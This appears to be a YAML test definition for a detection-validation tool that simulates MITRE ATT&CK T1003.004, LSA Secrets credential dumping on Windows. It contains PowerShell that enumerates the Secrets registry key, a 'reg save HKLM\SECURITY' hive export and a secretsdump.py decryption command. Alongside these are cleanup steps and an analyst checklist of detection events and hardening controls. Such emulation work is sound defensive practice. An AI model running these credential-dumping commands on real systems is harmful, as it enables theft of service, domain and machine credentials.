id: T1003.004_os_credential_dumping_lsa_secrets
name: "OS Credential Dumping — LSA Secrets"
mitre_technique: "T1003.004"
mitre_tactic: "credential_access"
description: >
  Adversaries with SYSTEM access read LSA Secrets from the registry at
  HKLM\SECURITY\Policy\Secrets. LSA Secrets store service account credentials
  (auto-logon services), the DPAPI backup key, cached domain credentials (NL$KM),
  VPN credentials, scheduled task passwords, and the machine account hash.
  The keys are encrypted with the SYSKEY and can be decrypted with access to both
  the SECURITY and SYSTEM hives. Mimikatz's lsadump::secrets reads these directly
  from the registry or from LSASS memory.
author: stanleytobias
created: "2026-01-01"
platform: windows
references:
  - https://attack.mitre.org/techniques/T1003/004/

steps:
  - step: 1
    type: marker
    description: "Pre-execution context"
    message: "Starting T1003.004 — LSA Secrets dump simulation"

  - step: 2
    type: exec_powershell
    description: "Enumerate LSA Secrets key names — access generates telemetry"
    command: |
      Write-Host "[PAS] LSA Secrets registry key enumeration:"
      try {
          # This will fail without SYSTEM — that's expected; the access attempt IS the telemetry
          $keys = Get-ChildItem "HKLM:\SECURITY\Policy\Secrets" -ErrorAction Stop
          Write-Host "[PAS] LSA Secrets keys (unexpectedly accessible — check security):"
          $keys | ForEach-Object { Write-Host "  $($_.PSChildName)" }
      } catch {
          Write-Host "[PAS] HKLM:\SECURITY\Policy\Secrets — access denied (expected without SYSTEM)"
          Write-Host "[PAS] Access attempt generated Event ID 4663 (if object access auditing enabled)"
      }

      Write-Host "[PAS] Common LSA Secrets:"
      @("_SC_*         — Service account credentials",
        "NL`$KM         — Cached domain credential encryption key",
        "DPAPI_SYSTEM   — DPAPI machine key (decrypts all machine-context DPAPI blobs)",
        "DefaultPassword— AutoLogon password",
        "`$MACHINE.ACC  — Machine account password hash") |
          ForEach-Object { Write-Host "  $_" }

  - step: 3
    type: exec_powershell
    description: "Simulate reg save HKLM\\SECURITY — hive export for offline decryption"
    command: |
      Write-Host "[PAS] SECURITY hive export attempt (requires SYSTEM):"
      $secDump = "$env:TEMP\PAS_T1003_004_SECURITY"
      $proc = Start-Process reg.exe `
          -ArgumentList "save HKLM\SECURITY $secDump /y" `
          -PassThru -NoNewWindow -Wait -ErrorAction SilentlyContinue
      Write-Host "[PAS] reg save HKLM\SECURITY exit code: $($proc?.ExitCode)"
      Write-Host "[PAS] With SYSTEM + SECURITY + SYSTEM hive: secretsdump.py -system SYSTEM -security SECURITY LOCAL"

  - step: 4
    type: sleep
    description: "Allow telemetry to flush"
    seconds: 3

  - step: 5
    type: marker
    description: "Post-execution prompt"
    message: "Check SIEM — reg.exe with HKLM\\SECURITY arguments, Event 4663 access to LSA Secrets keys"

cleanup:
  - step: 1
    type: exec_powershell
    description: "Remove any exported hive files"
    command: |
      Remove-Item "$env:TEMP\PAS_T1003_004_SECURITY" -Force -ErrorAction SilentlyContinue
      Write-Host "[PAS][Cleanup] LSA Secrets dump artefacts removed"

  - step: 2
    type: marker
    description: "Cleanup complete"
    message: "T1003.004 cleanup complete"

analyst_checklist:
  - "Process event: reg.exe with 'save HKLM\\SECURITY' argument"
  - "Event ID 4663: access attempt on HKLM\\SECURITY\\Policy\\Secrets (requires object access auditing)"
  - "Sentinel: DeviceProcessEvents | where FileName == 'reg.exe' and ProcessCommandLine contains 'SECURITY'"
  - "MDE alert: 'LSA secrets read attempt'"
  - "CONTROL CHECK: Enable object access auditing on SECURITY registry hive — requires manual audit SACL configuration"
  - "CONTROL CHECK: Service accounts should use gMSA (Group Managed Service Accounts) — no stored password in LSA Secrets"
  - "CONTROL CHECK: AutoLogon — never use domain credentials for AutoLogon; use a dedicated local account"
